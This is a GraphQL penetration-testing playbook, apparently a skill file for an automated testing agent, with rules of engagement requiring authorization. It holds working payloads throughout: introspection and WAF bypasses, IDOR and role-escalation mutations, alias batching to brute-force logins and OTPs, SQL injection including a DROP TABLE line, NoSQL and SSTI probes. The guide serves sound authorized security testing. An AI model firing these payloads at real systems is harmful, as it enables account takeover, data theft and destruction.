# GraphQL Security Testing

## Scope and preconditions

Applies to any application exposing a GraphQL API — look for `/graphql`,
`/gql`, `/api/graphql`, or WebSocket endpoints accepting GraphQL operations.
GraphQL consolidates multiple REST endpoints into one, so all authorization,
injection, and rate-limiting bugs concentrate at a single URL.

It does **not** cover: REST API testing (use `api`), general injection in
non-GraphQL contexts (use `sqli`, `nosql`), or authentication flaws outside
GraphQL (use `auth`).

## Rules of engagement

- MUST have written authorization before testing.
- NEVER run batching/alias attacks with more than 100 operations without
  confirming the target can handle the load. Start with 10, scale to 50, then 100.
- MUST NOT exfiltrate real user data via IDOR. Use your own test accounts.
- NEVER use recursive queries designed to cause DoS. Prove depth is unbounded
  with 5-6 levels, then stop.

## Workflow

- [ ] 1. Discover and fingerprint the GraphQL endpoint
- [ ] 2. Attempt introspection (and bypass if blocked)
- [ ] 3. Enumerate fields without introspection (clairvoyance)
- [ ] 4. Test authorization on queries and mutations
- [ ] 5. Test batching and alias abuse
- [ ] 6. Test injection through GraphQL arguments
- [ ] 7. Test query complexity and depth limits
- [ ] 8. Record findings

## Step 1: Discover and fingerprint

### Goal
Find the GraphQL endpoint and identify the engine.

### Actions
Use `get_endpoints` and `search_responses` to find GraphQL indicators:
- POST requests to `/graphql`, `/gql`, `/api/graphql`
- `Content-Type: application/json` with `"query":` in body
- WebSocket connections with GraphQL subscription frames
- Error messages containing `GraphQL`, `Cannot query field`, `Syntax Error`

Fingerprint the engine by sending a malformed query and examining the error:
```json
{"query": "{__typename @deprecated}"}
```

| Engine | Error pattern |
|---|---|
| Apollo | `"extensions": {"code": "GRAPHQL_VALIDATION_FAILED"}` |
| Hasura | `"code": "validation-failed"` |
| graphql-yoga | `"extensions": {"http": {"status": 400}}` |
| Ariadne | `"message": "Unknown directive"` |
| WPGraphQL | WordPress-style error format |

Engine matters: Hasura has known auth bypass patterns, WPGraphQL has IDOR-prone
default schemas, Apollo's `persistedQueries` can be abused.

## Step 2: Introspection

### Goal
Retrieve the full schema — types, fields, mutations, and arguments.

### Actions
Send the standard introspection query:
```json
{"query": "{__schema{types{name fields{name args{name type{name}}}}}}"}
```

If blocked (403, empty result, or error), try these bypass techniques:

**Newline injection**: Some WAFs block `__schema` but not across lines:
```json
{"query": "{\n__schema\n{types{name}}}"}
```

**Use `__type` instead**: Query individual types, not the full schema:
```json
{"query": "{__type(name:\"User\"){fields{name type{name}}}}"}
```

**GET method**: Switch from POST to GET with query in URL parameter:
```
GET /graphql?query={__schema{types{name}}}
```

**WebSocket path**: If the endpoint supports subscriptions, try introspection
over WebSocket where WAF rules may not apply.

**Fragment trick**: Break the introspection into fragments:
```json
{"query": "{...F} fragment F on Query {__schema{types{name}}}"}
```

**Content-Type variation**: Try `application/graphql` instead of
`application/json`:
```
POST /graphql
Content-Type: application/graphql

{__schema{types{name fields{name}}}}
```

**Comment injection**: `#comment\n{__schema{types{name}}}`

## Step 3: Clairvoyance (field discovery without introspection)

### Goal
Discover fields even when introspection is completely blocked.

### Technique
GraphQL returns "Cannot query field X on type Y" errors that reveal the type
name. And "Did you mean ..." suggestions reveal existing field names.

1. Send queries with guessed field names:
   ```json
   {"query": "{user{idd}}"}
   ```
   Response: `Cannot query field "idd" on type "User". Did you mean "id"?`

2. Use common field name wordlists: `id`, `email`, `name`, `password`,
   `role`, `admin`, `secret`, `token`, `balance`, `address`, `phone`,
   `ssn`, `creditCard`, `apiKey`, `isAdmin`, `permissions`, `groups`

3. Use `run_intruder_attack` with a field name wordlist to enumerate:
   ```json
   {"query": "{user{FUZZ}}"}
   ```
   Any response containing "Did you mean" reveals adjacent fields.

This technique recovers ~80% of the schema even when introspection is fully
disabled.

## Step 4: Test authorization

### Goal
Determine if field-level and object-level authorization is properly enforced.

### Actions
**Cross-account access (IDOR)**:
```json
{"query": "{user(id: \"OTHER_USER_ID\") {email phone}}"}
```

**Relay-style global IDs**: Many GraphQL APIs use Relay's `node` interface:
```json
{"query": "{node(id: \"VXNlcjox\") {...on User {email}}}"}
```
Decode the base64 ID: `User:1`. Increment to `User:2` → `VXNlcjoy`.

**Alias enumeration** — query 50 users in one request:
```json
{"query": "{u1:user(id:1){email} u2:user(id:2){email} u3:user(id:3){email} ...}"}
```

**Mutation authorization**: Test if mutations enforce permissions:
```json
{"query": "mutation{updateUser(id:\"OTHER\",role:\"admin\"){id role}}"}
```

**REST vs GraphQL inconsistency**: If the REST API enforces auth but the
GraphQL resolvers don't, the same data is exposed through GraphQL.

## Step 5: Batching and alias abuse

### Goal
Bypass rate limits and brute force via GraphQL's batching capabilities.

### Array batching
Send multiple operations in one request:
```json
[
  {"query": "mutation{login(user:\"admin\",pass:\"pass1\"){token}}"},
  {"query": "mutation{login(user:\"admin\",pass:\"pass2\"){token}}"},
  {"query": "mutation{login(user:\"admin\",pass:\"pass3\"){token}}"}
]
```
100 login attempts in one HTTP request — rate limits that count HTTP requests
are bypassed.

### Alias batching
Same operation under different aliases:
```json
{"query": "mutation {
  a1:login(user:\"admin\",pass:\"0000\"){token}
  a2:login(user:\"admin\",pass:\"0001\"){token}
  a3:login(user:\"admin\",pass:\"0002\"){token}
}"}
```
500 aliases bypass per-query rate limits. Used for OTP brute force:
1000 codes per HTTP request → ATO on 4-digit OTP.

### Batching DoS
```json
[...100 expensive queries...]
```
Each query individually is within limits, but 100 in one batch may overwhelm.

## Step 6: Injection through GraphQL

### Goal
Test if GraphQL arguments are passed unsafely to backend systems.

### SQL injection in resolver arguments
```json
{"query": "{users(search:\"admin' OR 1=1--\"){id email}}"}
{"query": "{users(orderBy:\"name; DROP TABLE users--\"){id}}"}
```

### NoSQL injection
```json
{"query": "{login(user:\"admin\",pass:{\"$ne\":\"\"}){token}}"}
```
Note: GraphQL input types may prevent object injection. Test if the resolver
accepts a JSON string that it parses internally.

### SSTI through template-rendered fields
If GraphQL responses are rendered in templates (emails, PDFs):
```json
{"query": "mutation{updateProfile(bio:\"{{7*7}}\"){bio}}"}
```
Check the rendered output for `49`.

## Step 7: Query complexity and depth

### Goal
Determine if query depth and complexity are limited.

### Actions
Nested query (depth 6+):
```json
{"query": "{user{posts{comments{author{posts{comments{id}}}}}}}"}
```
If this returns results, try depth 10, 15, 20. Each level multiplies database
load exponentially.

Check for `queryComplexity` or `depthLimit` middleware by observing error
messages when queries get too deep.

## Step 8: Record the finding

Use `add_pentest_finding` with:
- The specific technique that succeeded
- The GraphQL query used
- The data obtained or action performed
- Impact: data exposure scope, rate limit bypass scale

## Known false positives

- Introspection returning empty results — may be a subset schema, not a bypass
  failure. Check if the returned types match what you see in traffic.
- Alias queries that return errors for all attempts — the aliases worked but
  the operation itself failed. That is not a rate limit bypass.
- `node` interface returning data for your own user — that is expected. Only
  report if it returns OTHER users' data.
- Batching accepted but each operation individually rate-limited — the server
  processes batches sequentially with per-operation limits. This is correct.

## Reminder

The three highest-value GraphQL findings: **introspection bypass** (reveals
the entire attack surface), **alias batching for brute force** (OTP/login
bypass), and **Relay node IDOR** (cross-account data access). Always test
alias batching on authentication mutations — it is the most commonly missed
rate limit bypass in GraphQL APIs.
